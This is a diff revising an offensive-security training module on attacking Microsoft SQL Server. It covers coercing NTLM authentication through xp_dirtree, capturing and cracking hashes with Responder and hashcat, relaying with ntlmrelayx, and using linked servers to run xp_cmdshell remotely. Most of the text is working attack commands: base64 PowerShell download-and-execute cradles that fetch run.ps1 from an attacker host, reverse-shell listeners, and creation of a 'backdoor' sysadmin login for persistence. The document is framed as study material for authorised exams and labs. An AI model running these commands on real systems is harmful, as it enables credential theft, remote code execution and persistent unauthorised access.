@@ -2,152 +2,172 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 11 · MSSQL: auth triggers, credential capture/relay, and linked servers
+# MSSQL auth triggers and linked servers
 
-> **Covers scenarios:** 44, 45
->
-> **Course mapping:** Chapter 20 (§20.1.3 UNC Path Injection, §20.1.4 Relay My Hash, §20.2 MS SQL Escalation & Custom Assemblies, §20.3 Linked SQL Servers), Chapter 21 (§21.6.2 Linked SQL Servers in the Forest); scenario 44 → C4, scenario 45 → C2, C6
->
-> **Prerequisites:** a SQL Server instance you can log into (SQL auth or Windows auth, either works); the attacker box (Kali) must be reachable from the target instance in the reverse direction (outbound 445/SMB not blocked); PowerUpSQL / SQLRecon / Impacket / Responder / ntlmrelayx / hashcat prepared per scenario
+A low-privilege SQL login often cannot run OS commands, but it can still force the service account to authenticate outbound (UNC/SMB). If signing is not enforced on another host, relay; if it is, capture and crack. When a Linked Server can query but not execute, the usual fork is RPC Out vs the mapped login's rights vs impersonation.
 
----
+## SQL login works, OS commands do not
 
-## Scenario 44: SQL login works, but you cannot run OS commands
+If you only have a low-privilege database login and every command-execution channel (`xp_cmdshell` / OLE / CLR) is unavailable, trigger outbound SMB auth from the SQL service account. Probe signing first, then pick capture or relay — don't start relaying blindly.
 
-**Situation**: You only have a low-privilege database login, and every command-execution channel (`xp_cmdshell` / OLE / CLR) is unavailable. But that SQL session identity can still trigger **outbound network authentication** (UNC/SMB requests), and the environment contains another host that meets the SMB relay conditions (signing not enforced), or you can crack the captured Net-NTLMv2 offline.
+- [ ] Confirm the tools are present and prepare the reverse-shell payload (UTF-16LE + Base64, for ntlmrelayx `-c`)
+- [ ] If the SQL host cannot reach you, punch 445 back with Ligolo-ng first
+- [ ] Probe SMB signing on the relay target
+- [ ] Connect with the low-privilege login and confirm you really cannot run OS commands
+- [ ] List other instances this one can see
+- [ ] Path A: Responder capture + hashcat. Path B: ntlmrelayx, only if signing is not required
 
-**Assumptions**:
-- You already have a working SQL login: SQL auth (`USER`/`PASS`) or domain Windows auth (`DOMAIN\USER`).
-- That login is **not** `sysadmin` and cannot enable `xp_cmdshell` (this is this scenario's failure point — confirm it before taking the relay path).
-- The target instance can make SMB requests to `\\LHOST\...` (the SQL Server process runs as a domain or machine account and can make outbound SMB; if egress is restricted, see "Failure branches and alternatives" and use a tunnel).
-- Attacker side prepared in advance: `Responder`, `impacket-ntlmrelayx`, `hashcat` + wordlist, PowerUpSQL template scripts, reverse-shell payload.
-- The SMB signing state of the target host is unknown — probe first, then decide between the capture and the relay path.
+Confirm the tools:
 
-**Prepare (attacker side)**:
+```bash
+which responder impacket-ntlmrelayx impacket-mssqlclient hashcat
+```
 
-1. Confirm the tools are all present:
-   ```bash
-   which responder impacket-ntlmrelayx impacket-mssqlclient hashcat
-   ```
-   If the Impacket suite is missing: `sudo apt update && sudo apt install -y impacket-scripts responder hashcat` (Kali ships responder / impacket).
+If the Impacket suite is missing: `sudo apt update && sudo apt install -y impacket-scripts responder hashcat` (Kali ships responder / impacket).
 
-2. Prepare the reverse-shell payload and encode it as UTF-16LE + Base64 (for the relay's `-c` argument):
-   ```bash
-   # 1) prepare run.ps1 (downloads and runs stage 2) and put it in the HTTP directory
-   echo -en 'IEX ((new-object net.webclient).downloadstring("http://LHOST/run.ps1"))' | iconv -t UTF-16LE | base64 -w 0
-   # 2) keep stage-2 files such as nc64.exe / a custom runner in that directory
-   python3 -m http.server 80
-   ```
+Prepare the payload and serve stage two:
 
-3. (Optional) If the SQL instance is on an internal network, on a different segment from the attacker box, punch the return path through with Ligolo-ng first (`Tunneling` → Ligolo-ng): add a listener in the agent session and map the attacker's 445 through it:
-   ```
-   listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
-   ```
-   Record the final attacker IP that is reachable from the target's point of view as `LHOST`.
+```bash
+# 1) prepare run.ps1 (downloads and runs stage 2) and put it in the HTTP directory
+echo -en 'IEX ((new-object net.webclient).downloadstring("http://LHOST/run.ps1"))' | iconv -t UTF-16LE | base64 -w 0
+# 2) keep stage-2 files such as nc64.exe / a custom runner in that directory
+python3 -m http.server 80
+```
 
-4. Probe SMB signing on the relay target (the other host you are going to hit):
-   ```bash
-   nmap -p445 --script smb2-security-mode TARGET
-   # Expect: Message signing enabled but not required  → relay works
-   #         Message signing enabled and required     → capture + crack only
-   ```
+If the SQL instance is on an internal network, punch the return path through with Ligolo-ng first ([pivoting / tunneling](/modules/08-pivoting-tunneling)): add a listener in the agent session and map the attacker's 445 through it:
 
-**Procedure**:
+```
+listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
+```
 
-1. Connect to the instance with the low-privilege login and confirm the current privilege state (first verify that you really cannot run OS commands):
-   ```bash
-   # From Kali (SQL auth)
-   impacket-mssqlclient USER:PASS@TARGET -windows-auth    # for a domain account: DOMAIN/USER:PASS@TARGET
-   ```
-   Inside the mssqlclient interactive session, run these in order:
-   ```sql
-   SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa;
-   SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
-   -- is_sa = 0 and xp_cmdshell value_in_use = 0 → take this scenario's path
-   xp_cmdshell whoami
-   -- Expect: permission denied (xp_cmdshell requires sysadmin or CONTROL SERVER privilege)
-   ```
-   From Windows, the PowerShell + Invoke-SQLCmd template scripts work too (see `m11-powerupsql-templates.ps1`).
+Record the final attacker IP that is reachable from the target's point of view as `LHOST`.
 
-2. List the other SQL instances / targets this instance can see (to identify which "other target" meets the relay conditions):
-   ```powershell
-   # PowerUpSQL: SPN scan
-   Get-SQLInstanceDomain
-   # connection test — find instances that are reachable and may allow relay
-   Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
-   ```
-   Or from the command line: `setspn -T DOMAIN -Q MSSQLSvc/*`.
+Probe SMB signing on the relay target:
 
-3. Path A — **capture mode (Responder + crack)**:
-   ```bash
-   sudo responder -I eth0    # use your real listen interface; by default it listens on UDP 53/137/138 + TCP 445, etc.
-   ```
-   Trigger outbound SQL authentication (inside the mssqlclient session):
-   ```sql
-   EXEC master..xp_dirtree '\\LHOST\share';
-   -- often works at low privilege too; if denied, see "Failure branches and alternatives"
-   ```
-   Expected Responder output (this means the capture succeeded):
-   ```
-   [SMB] NTLMv2-SSP Client   : ::ffff:<TARGET_IP>
-   [SMB] NTLMv2-SSP Username : DOMAIN\sqlservice
-   [SMB] NTLMv2-SSP Hash     : sqlservice::DOMAIN:...:...:...:...
-   ```
-   Offline crack:
-   ```bash
-   copy the whole line out of the responder output into hash.txt
-   hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
-   ```
+```bash
+nmap -p445 --script smb2-security-mode TARGET
+# Expect: Message signing enabled but not required  → relay works
+#         Message signing enabled and required     → capture + crack only
+```
 
-4. Path B — **relay mode (ntlmrelayx → a target that meets the conditions)**:
-   ```bash
-   # listen on 445; forward the authentication relayed from the target to TARGET (that target's SMB signing is not enforced)
-   # example: have the relayed SMB authentication download and run on the target, calling back to LHOST
-   impacket-ntlmrelayx --no-http-server -smb2support -t smb://TARGET \
-     -c "powershell -enc <BASE64_FROM_STEP_2>"
-   ```
-   If the target is another SQL instance (mssql:// relay — confirm support by testing in your lab):
-   ```bash
-   impacket-ntlmrelayx --no-http-server -smb2support -t mssql://TARGET2
-   ```
-   Start a listener in another terminal:
-   ```bash
-   nc -nvlp LPORT
-   ```
-   Trigger authentication (run it inside the SQL session you already control; the same applies if you have a web shell or another foothold on that host):
-   ```sql
-   EXEC master..xp_dirtree '\\LHOST\c';
-   -- or with a Windows command: dir \\LHOST\c
-   ```
-   Expected ntlmrelayx output:
-   ```
-   [*] SMBD-Thread-4: Received connection from <SQL_HOST>, attacking target smb://TARGET
-   [*] Authenticating against smb://TARGET as DOMAIN\sqlservice SUCCEED
-   [*] Executed specified command on host: TARGET
-   ```
+Connect with the low-privilege login. SQL auth does **not** take `-windows-auth`; that flag is only for domain / Windows auth:
 
-5. Handle what you got:
-   - Capture mode gives you the cleartext password → move laterally straight away (netexec smb / psexec / WinRM).
-   - You got an NTLM hash that will not crack → try Pass-The-Hash against other hosts that reuse the password.
-   - Relay mode succeeded → check the reverse-shell listener; no shell means confirm AV/AMSI first (hand off to M05/M07).
+```bash
+# From Kali (SQL auth)
+impacket-mssqlclient USER:PASS@TARGET
+# Domain / Windows auth
+impacket-mssqlclient DOMAIN/USER:PASS@TARGET -windows-auth
+```
 
-6. Common pivots for actually getting execution on SQL afterwards (if the environment does have `sysadmin` or an impersonatable principal):
-   ```powershell
-   # PowerUpSQL audit (find impersonatable logins and similar)
-   Invoke-SQLAudit -Verbose -Instance TARGET
-   Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance TARGET -Exploit
-   ```
-   See `m11-powerupsql-templates.ps1` (impersonation, CLR and other templates) and scenario 45 (the Linked Server path).
+Inside the mssqlclient session, confirm you cannot run OS commands:
 
-**Scripts used**:
-| Script | Purpose | Key parameters |
-|---|---|---|
-| `m11-responder-relay-sql.sh` | One-shot Responder capture / ntlmrelayx relay + prints the SQL trigger commands | `LHOST`, `LPORT`, `TARGET` |
-| `m11-powerupsql-templates.ps1` | Instance discovery, privilege check, audit, impersonation/execution | `-Instance TARGET` |
-| `m11-sqlrecon-templates.ps1` | SQLRecon counterpart templates (/m:info /m:xpcmd, etc.) | `/h:TARGET /a:WinToken` |
-| `m11-linked-server-queries.sql` | Query set for cross-instance enumeration (in this scenario, use it to confirm "the other instance") | see the file header |
+```sql
+SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin') AS is_sa;
+SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
+-- is_sa = 0 and xp_cmdshell value_in_use = 0 → take this path
+xp_cmdshell whoami
+-- Expect: permission denied (xp_cmdshell requires sysadmin or CONTROL SERVER privilege)
+```
 
-#### `m11-powerupsql-templates.ps1`
+From Windows, the PowerShell + Invoke-SQLCmd templates work too (see `m11-powerupsql-templates.ps1`).
+
+List the other SQL instances this one can see (to identify which other target meets the relay conditions):
+
+```powershell
+# PowerUpSQL: SPN scan
+Get-SQLInstanceDomain
+# connection test — find instances that are reachable and may allow relay
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+```
+
+Or from the command line: `setspn -T DOMAIN -Q MSSQLSvc/*`.
+
+### Capture (Responder + crack)
+
+If signing is required, or you just want the hash:
+
+```bash
+sudo responder -I eth0    # use your real listen interface; by default it listens on UDP 53/137/138 + TCP 445, etc.
+```
+
+Trigger outbound SQL authentication (inside the mssqlclient session):
+
+```sql
+EXEC master..xp_dirtree '\\LHOST\share';
+-- often works at low privilege too; if denied, try the alternatives below
+```
+
+Expected Responder output (this means the capture succeeded):
+
+```
+[SMB] NTLMv2-SSP Client   : ::ffff:<TARGET_IP>
+[SMB] NTLMv2-SSP Username : DOMAIN\sqlservice
+[SMB] NTLMv2-SSP Hash     : sqlservice::DOMAIN:...:...:...:...
+```
+
+Offline crack:
+
+```bash
+# copy the whole line out of the responder output into hash.txt
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+### Relay (ntlmrelayx)
+
+If signing is not required, listen on 445 and forward the authentication to the target:
+
+```bash
+# example: have the relayed SMB authentication download and run on the target, calling back to LHOST
+impacket-ntlmrelayx --no-http-server -smb2support -t smb://TARGET \
+  -c "powershell -enc <BASE64_FROM_STEP_2>"
+```
+
+If the target is another SQL instance (mssql:// relay — confirm support by testing in your lab):
+
+```bash
+impacket-ntlmrelayx --no-http-server -smb2support -t mssql://TARGET2
+```
+
+Start a listener in another terminal:
+
+```bash
+nc -nvlp LPORT
+```
+
+Trigger authentication (run it inside the SQL session you already control; the same applies if you have a web shell or another foothold on that host):
+
+```sql
+EXEC master..xp_dirtree '\\LHOST\c';
+-- or with a Windows command: dir \\LHOST\c
+```
+
+Expected ntlmrelayx output:
+
+```
+[*] SMBD-Thread-4: Received connection from <SQL_HOST>, attacking target smb://TARGET
+[*] Authenticating against smb://TARGET as DOMAIN\sqlservice SUCCEED
+[*] Executed specified command on host: TARGET
+```
+
+Handle what you got. Capture mode gives you the cleartext password → move laterally straight away (netexec smb / psexec / WinRM). You got an NTLM hash that will not crack → try Pass-the-Hash against other hosts that reuse the password. Relay mode succeeded → check the reverse-shell listener; no shell means confirm AV/AMSI first (hand off to [module 05](/modules/05-applocker-clm-amsi) / [module 07](/modules/07-credentials-lsass)).
+
+If the environment does have `sysadmin` or an impersonatable principal, common pivots for actually getting execution on SQL afterwards:
+
+```powershell
+# PowerUpSQL audit (find impersonatable logins and similar)
+Invoke-SQLAudit -Verbose -Instance TARGET
+Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance TARGET -Exploit
+```
+
+See `m11-powerupsql-templates.ps1` (impersonation, CLR and other templates) and the Linked Server path below.
+
+If `xp_dirtree` is denied (`EXECUTE permission denied`), try the similar extended stored procedures one by one: `EXEC master..xp_subdirs '\\LHOST\x';`, `EXEC master..xp_fileexist '\\LHOST\x';`. If those still fail, look inside the database for a stored procedure / trigger / job defined as sysadmin, or for an `EXECUTE AS` impersonatable principal (`Invoke-SQLAuditPrivImpersonateLogin`), and fire the UNC from inside it.
+
+If the target enforces SMB signing, relay is not viable — stay on capture + crack, or look for an HTTP/HTTPS/LDAP relay target (`ntlmrelayx -t http://...` / `-t ldap://...`, for HTTP services without EPA; see ESC8 in [AD attacks](/modules/12-ad-attacks)). If the SQL host cannot reach `LHOST`, use Ligolo-ng on a reachable host to open `listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445`, and change the trigger target from `\\LHOST\` to `\\<ligolo listen address>\`. If Responder and ntlmrelayx fight over the port, run only one service — they cannot both hold 445. If the relayed command is blocked by AV, switch to in-memory loading (`-c "powershell ..."` with a direct IEX download string), staged execution, or a different encoding (modules 05 / 07).
+
+The identity you get from a relay is not an interactive credential: when moving laterally prefer SMB/service protocols (wmiexec, psexec) and do not waste time trying RDP (unless that account is in Remote Desktop Users). The privileges a successful relay gives you are decided by the local group membership of the relayed account on the target. Trigger right after `responder -I <iface>` and finish as fast as you can — listening on 445 briefly disturbs normal SMB traffic, and `xp_dirtree` shows up in the SQL error log / Profiler.
+
+::: details `m11-powerupsql-templates.ps1` · click to expand
 
 ````powershell
 <#
@@ -249,7 +269,10 @@ Write-Output ""
 Write-Output "[*] Change the placeholders on the lines you use and paste them into your exam notes; run read-only recon first and confirm action commands one by one."
 ````
 
-#### `m11-responder-relay-sql.sh`
+:::
+
+
+::: details `m11-responder-relay-sql.sh` · click to expand
 
 ````bash
 #!/usr/bin/env bash
@@ -390,7 +413,10 @@ fi
 print_loot
 ````
 
-#### `m11-sqlrecon-templates.ps1`
+:::
+
+
+::: details `m11-sqlrecon-templates.ps1` · click to expand
 
 ````powershell
 <#
@@ -497,7 +523,152 @@ if ($Target) {
 }
 ````
 
-#### `m11-linked-server-queries.sql`
+:::
+
+
+## Linked Server can query, remote execution fails
+
+If you can already reach instance A and query B over a Linked Server, but `EXEC ... AT B` / `xp_cmdshell` on B fails, pin down the exact boundary first. The cause usually sits in one of three places: the mapped login on B having low privileges, RPC Out on A→B not enabled, or the privilege configuration on the two ends not matching.
+
+- [ ] Connect to A and list linked servers
+- [ ] Test query vs `EXEC ... AT` vs four-part names, and read the error
+- [ ] Check the remote identity and privileges on B
+- [ ] Enable RPC Out / data access if you can (or impersonate a sysadmin who can)
+- [ ] Leave long commands to a URL download; the remote should run only the shortest command
+
+Connect to the source instance A:
+
+```bash
+impacket-mssqlclient USER:PASS@A_HOST        # SQL auth
+impacket-mssqlclient DOMAIN/USER:PASS@A_HOST -windows-auth   # Windows auth
+```
+
+List linked servers (SQL Server 2008+ uses `sys.servers`):
+
+```sql
+SELECT name, product, provider, data_source, is_linked, is_rpc_out_enabled,
+       is_data_access_enabled, is_remote_provider_enabled
+FROM sys.servers;
+```
+
+Expect at least one row with `is_linked = 1`. Long commands executed through a Linked Server very easily break on quotes/length — make the long content a URL download (`http://LHOST/x.ps1`) and let the remote side run only the shortest command.
+
+Pin down "can query, cannot execute":
+
+```sql
+-- (a) single-hop query: does it work?
+SELECT * FROM OPENQUERY("TARGET2", 'SELECT @@SERVERNAME AS srv, SYSTEM_USER AS u, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa');
+-- (b) EXEC AT remote execution: what is the error when it fails?
+EXEC ('SELECT @@SERVERNAME') AT TARGET2;
+-- (c) four-part name query (needs remote data access + metadata; usually unavailable on A by default)
+SELECT * FROM [TARGET2].[master].[dbo].[syslogins];   -- if you get an OLE DB provider error → troubleshoot data access
+```
+
+If you see `SQL Server blocked access to ... 'Ad Hoc Distributed Queries'` / `OLE DB provider "SQLNCLI11" ... cannot be used for distributed queries`, it is a `data access` / OPENQUERY configuration problem. If you see `The RPC server is unavailable` / `Server 'TARGET2' is not configured for RPC`, RPC Out is not enabled. If you see `Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'`, on a double hop the middle server cannot delegate. If remote execution succeeds but `xp_cmdshell` reports a permission error, the remote mapped account is not sysadmin.
+
+Check the remote identity and privileges (see who is really executing on B):
+
+```sql
+EXEC ('SELECT SYSTEM_USER AS remote_user, USER_NAME() AS db_user, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa') AT TARGET2;
+-- empty/guest means it goes through the mapped guest login → extremely low privileges
+```
+
+Check whether B can see deeper links itself (to pave the way for multi-hop):
+
+```sql
+SELECT * FROM OPENQUERY("TARGET2", 'SELECT name, is_rpc_out_enabled, is_linked FROM sys.servers');
+```
+
+RPC Out = allows calling the remote through `EXEC ... AT`:
+
+```sql
+-- view A's RPC settings for B (SQL Server 2008+)
+SELECT name, is_rpc_out_enabled FROM sys.servers WHERE name='TARGET2';
+-- if it is 0 and we have sysadmin (or CONTROL SERVER / ALTER ANY LINKED SERVER), turn it on:
+EXEC sp_serveroption 'TARGET2', 'rpc out', 'true';
+-- without sysadmin this is a hard limit: either find an impersonatable sysadmin (Invoke-SQLAuditPrivImpersonateLogin), or give up on EXEC AT and fall back to read-only OPENQUERY queries
+```
+
+`sp_serveroption` is a server-level setting, so low privileges usually cannot change it. Try `EXECUTE AS LOGIN='sa'` first (if it is impersonatable):
+
+```sql
+EXECUTE AS LOGIN = 'sa';
+EXEC sp_serveroption 'TARGET2', 'rpc out', 'true';
+REVERT;
+```
+
+When you need `OPENQUERY`, confirm A allows distributed queries against B (data access):
+
+```sql
+EXEC sp_serveroption 'TARGET2', 'data access', 'true';   -- also needs sufficient privileges
+```
+
+Enable `xp_cmdshell` on B and execute (prerequisite: the identity mapped on B is sysadmin, or you can impersonate B's sysadmin from A):
+
+```sql
+EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT TARGET2;
+EXEC ('EXEC master..xp_cmdshell ''whoami''') AT TARGET2;
+```
+
+Enable OLE remotely (backup execution channel):
+
+```sql
+EXEC ('EXEC sp_configure ''Ole Automation Procedures'',1; RECONFIGURE;') AT TARGET2;
+```
+
+Single-hop command execution / get a shell — leave the long command to the download:
+
+```sql
+-- way 1: a short xp_cmdshell command directly
+EXEC ('EXEC master..xp_cmdshell ''whoami /all''') AT TARGET2;
+-- way 2: have B download and run it (B needs outbound access to LHOST)
+EXEC ('EXEC master..xp_cmdshell ''powershell -nop -w hidden -c "iex(iwr http://LHOST/run.ps1)"''') AT TARGET2;
+-- way 3: the whole thing in base64 (fewest quotes):
+EXEC ('EXEC master..xp_cmdshell ''powershell -enc <BASE64>''') AT TARGET2;
+```
+
+For a callback: start `nc -nvlp LPORT` on the attacker first, and put `run.ps1` in the HTTP directory (its content = download and execute a reverse shell).
+
+Multi-hop (A→B→C) — send one `EXEC` from A to B that makes B send another `EXEC` to C:
+
+```sql
+-- enumerate C: look at B's links through B
+SELECT * FROM OPENQUERY("TARGET2", 'SELECT name, is_rpc_out_enabled FROM sys.servers');
+-- execute on C (the whole B→C EXEC AT is wrapped as a string handed to B)
+EXEC ('EXEC (''EXEC master..xp_cmdshell ''''whoami'''''') AT TARGET3') AT TARGET2;
+-- multi-hop query: all quotes in the inner OPENQUERY double
+SELECT * FROM OPENQUERY("TARGET2", 'SELECT * FROM OPENQUERY("TARGET3", ''SELECT @@SERVERNAME AS srv'')');
+```
+
+Quote rules (extremely easy to get wrong): in the outermost SQL, strings use single quotes; a single quote inside a string is doubled `''`. `OPENQUERY` server names use double quotes; inside an outer string the double quotes stay as they are, but when an outer PowerShell / command-line layer wraps it again, escape per that shell's rules. Copy from `m11-linked-server-queries.sql` (quote levels annotated) and change only the server name — do not hand-write the nesting.
+
+Once you have a sysadmin session on B, you can run OS commands as above, or add a new login on B and make it sysadmin (if you want to connect to B directly later and skip A's long chain):
+
+```sql
+EXEC ('EXEC sp_addlogin ''backdoor'', ''P@ssw0rd!''') AT TARGET2;
+EXEC ('EXEC sp_addsrvrolemember ''backdoor'', ''sysadmin''') AT TARGET2;
+-- then connect directly: impacket-mssqlclient backdoor:P@ssw0rd!@B_HOST
+```
+
+In the exam, decide whether to run persistence actions like "add a login" based on the objective; confirm the goal first.
+
+`EXEC ('SELECT @@SERVERNAME, SYSTEM_USER') AT TARGET2` returning B's hostname and the remote user means RPC works. `xp_cmdshell 'whoami'` returning `nt service\mssql$...` or `DOMAIN\svc_sql` means remote command execution works. Multi-hop execution returning C's `whoami` means the chain is complete.
+
+If `EXEC ... AT` reports "not configured for RPC", try running `sp_serveroption 'TARGET2','rpc out','true'` as an impersonatable sysadmin (`EXECUTE AS LOGIN='sa'`). If you cannot impersonate, switch to the read-only `OPENQUERY` path or hunt for new credentials — without RPC Out you cannot call stored procedures / `xp_cmdshell` remotely, data queries only.
+
+If the remote side can execute but is not sysadmin (`xp_cmdshell` denied), do login enumeration + impersonation on B: `EXEC ('SELECT name FROM sys.server_principals WHERE type IN (''U'',''S'')') AT TARGET2`; use PowerUpSQL `Invoke-SQLAuditPrivImpersonateLogin -Exploit` to find a login you can impersonate into sysadmin, then execute.
+
+If on multi-hop you get `NT AUTHORITY\ANONYMOUS LOGON` / a Kerberos delegation error, the B→C link needs credential delegation and double-hop `EXEC` is blocked on some versions/configurations. Alternatives: use four-part names for data-level access `SELECT * FROM [TARGET2]...[sysservers]`, or pull C's connection information out of B and connect to C directly (if the port is reachable), or take full control of B and add credentials there to connect to C directly.
+
+If the command is too long or quotes cause syntax errors, convert everything to "download + execute" short commands: let the remote run only `powershell -enc <shortBASE64>` or `curl http://LHOST/x`. Generate the BASE64 locally with `iconv -t UTF-16LE | base64 -w 0` (the command itself then contains no quotes or spaces, which is the most reliable form).
+
+If `OPENQUERY` reports OLE DB / distributed queries disabled, you need `data access=true` (needs sysadmin). If you do not have it, pull B's data back to A with plain `SELECT` loops and do not chase remote in-place execution.
+
+If A itself is low-privilege with no impersonatable sysadmin, go back to the outbound-auth + relay path and lure A's SQL service account onto another target.
+
+First work out whether this gives you data access or server control: many objectives only need you to read one table in B over the Linked Server (in which case do not mess with `xp_cmdshell`). Enabling `xp_cmdshell` remotely attracts DBA / EDR-style monitoring immediately; after the validation step you can turn it back off if the objective does not need it: `EXEC ('EXEC sp_configure ''xp_cmdshell'',0; RECONFIGURE;') AT TARGET2`.
+
+::: details `m11-linked-server-queries.sql` · click to expand
 
 ````sql
 -- ============================================================================
@@ -636,200 +807,27 @@ SELECT * FROM OPENQUERY([LINK1],
 -- ============================================================================
 ````
 
-**Validation**:
-- An `[SMB] NTLMv2-SSP Hash` line appears in the Responder window → the capture succeeded; hashcat recovers cleartext → the credentials work (validate with `netexec smb` or `evil-winrm`).
-- ntlmrelayx shows `Authenticating ... SUCCEED` and `Executed specified command on host` → the relay executed; a connection shows up on the reverse-shell listener.
-- If all you wanted was a stable callback, check that `nc -nvlp LPORT` receives a connection and interact with `whoami`.
+:::
 
-**Failure branches and alternatives**:
-1. `xp_dirtree` is denied (even at low privilege you get `EXECUTE permission denied`) → try the similar extended stored procedures one by one: `EXEC master..xp_subdirs '\\LHOST\x';`, `EXEC master..xp_fileexist '\\LHOST\x';`; if those still fail, look inside the database for a **stored procedure / trigger / job defined as sysadmin** or for an `EXECUTE AS` impersonatable principal (`Invoke-SQLAuditPrivImpersonateLogin`) and fire the UNC from inside it.
-2. The target enforces SMB signing → relay is not viable → switch to path A (Responder capture + hashcat crack), or look for an HTTP/HTTPS/LDAP relay target (`ntlmrelayx -t http://...` / `-t ldap://...`, for HTTP services without EPA; see the ESC8 idea in M12 scenario 55).
-3. The SQL host cannot reach `LHOST` (return traffic blocked by a firewall) → use Ligolo-ng on a reachable host to open `listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445`, and change the trigger target from `\\LHOST\` to `\\<ligolo listen address>\` (details in the M08 `Tunneling` section).
-4. Responder and ntlmrelayx fight over the port / another host in the environment is squatting on 445 → run only one service; change the Responder interface or use `-w`/`-r` for precise control; make sure you are not hanging both Responder and relayx on 445.
-5. The relayed command is blocked by AV (the payload is killed on landing) → switch to in-memory loading (`-c "powershell ..."` with a direct IEX download string), staged execution, or a different encoding (M05/M07 methods).
 
-**Exam / OPSEC notes**:
-- Responder / ntlmrelayx listening on 445 briefly disturbs normal SMB traffic on that segment; on an exam network be careful not to pull the DC's authentication in as well and create "account lockout" noise — trigger right after `responder -I <iface>` and finish as fast as you can.
-- Trigger actions such as `xp_dirtree` show up in the SQL Server error log/Profiler; fine in a lab, assess first in production.
-- The identity you get from a relay is **not** an interactive credential: when moving laterally with it prefer SMB/service protocols (wmiexec, psexec) and do not waste time trying RDP (unless that account is in Remote Desktop Users).
-- Record explicitly whether the target account counts as a "sensitive account" (domain admin/service account); the privileges a successful relay gives you are decided by the local group membership of the relayed account on the target.
+## Cheat sheet
 
----
-
-## Scenario 45: Linked Server can query, but remote execution fails
-
-**Situation**: We can already reach instance A, and it has a Linked Server pointing at instance B (or even C); querying B's data from A succeeds, but anything involving **remote execution** (`EXEC ... AT B`, `xp_cmdshell` on B, cross-server RPC) fails. The cause usually sits in one of three places: the **mapped login** on B having low privileges, **RPC/RPC Out** on A→B not being enabled, and the **privilege configuration on the two ends not matching** (for example A is sysadmin but maps to B as only public).
-
-**Assumptions**:
-- A valid login on instance A (SQL auth or Windows auth), at least `public` on A, quite possibly lower.
-- On A you can already see a Linked Server named `LINKED_B` (this note uses `TARGET2` for its host), and `SELECT` works (otherwise fix connectivity/credentials first; that is not this scenario's failure point).
-- This scenario calls A the "source instance", B the "one hop" and C the "two hop" (A→B→C).
-- Have ready: `impacket-mssqlclient` (Linux) or PowerUpSQL/SQLRecon (Windows), and `m11-linked-server-queries.sql`.
-
-**Prepare (attacker side)**:
-1. Connect to the source instance A:
-   ```bash
-   impacket-mssqlclient USER:PASS@A_HOST        # SQL auth
-   impacket-mssqlclient DOMAIN/USER:PASS@A_HOST -windows-auth   # Windows auth
-   ```
-2. Confirm you can list linked servers (SQL Server 2008+ uses `sys.servers`):
-   ```sql
-   SELECT name, product, provider, data_source, is_linked, is_rpc_out_enabled,
-          is_data_access_enabled, is_remote_provider_enabled
-   FROM sys.servers;
-   ```
-   Expect at least one row with `is_linked = 1`.
-3. Get into the "short payload" mindset: long commands executed through a Linked Server very easily break on quotes/length; make the long content a **URL download** (`http://LHOST/x.ps1`) and let the remote side run only the shortest command. Keep the payload file in the attacker's HTTP directory; see the notes in the script templates.
-
-**Procedure**:
-
-1. Pin down the exact boundary of "can query, cannot execute" — test item by item and troubleshoot in order:
-   ```sql
-   -- (a) single-hop query: does it work?
-   SELECT * FROM OPENQUERY("TARGET2", 'SELECT @@SERVERNAME AS srv, SYSTEM_USER AS u, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa');
-   -- (b) EXEC AT remote execution: what is the error when it fails?
-   EXEC ('SELECT @@SERVERNAME') AT TARGET2;
-   -- (c) four-part name query (needs remote data access + metadata; usually unavailable on A by default)
-   SELECT * FROM [TARGET2].[master].[dbo].[syslogins];   -- if you get an OLE DB provider error → troubleshoot data access
-   ```
-   Common errors, quick reference:
-   - `SQL Server blocked access to ... 'Ad Hoc Distributed Queries'` / `OLE DB provider "SQLNCLI11" ... cannot be used for distributed queries` → `data access`/openquery configuration problem (step 4).
-   - `The RPC server is unavailable` / `Server 'TARGET2' is not configured for RPC` → `rpc out` not enabled (step 3).
-   - `Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'` → on a **double hop** the middle server cannot delegate (see failure branch 3).
-   - Remote execution succeeds but `xp_cmdshell` reports a permission error → the remote mapped account is not sysadmin (step 5).
-
-2. Check the **remote identity and privileges** (see who is really executing on B):
-   ```sql
-   EXEC ('SELECT SYSTEM_USER AS remote_user, USER_NAME() AS db_user, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa') AT TARGET2;
-   -- empty/guest means it goes through the mapped guest login → extremely low privileges
-   ```
-   Check whether B can see deeper links itself (to pave the way for multi-hop):
-   ```sql
-   SELECT * FROM OPENQUERY("TARGET2", 'SELECT name, is_rpc_out_enabled, is_linked FROM sys.servers');
-   ```
-
-3. **Handle the RPC configuration** (RPC Out = allows calling the remote through `EXEC ... AT`):
-   ```sql
-   -- view A's RPC settings for B (SQL Server 2008+)
-   SELECT name, is_rpc_out_enabled FROM sys.servers WHERE name='TARGET2';
-   -- if it is 0 and we have sysadmin (or CONTROL SERVER / ALTER ANY LINKED SERVER), turn it on:
-   EXEC sp_serveroption 'TARGET2', 'rpc out', 'true';
-   -- without sysadmin this is a hard limit: either find an impersonatable sysadmin (Invoke-SQLAuditPrivImpersonateLogin), or give up on EXEC AT and fall back to read-only OPENQUERY queries
-   ```
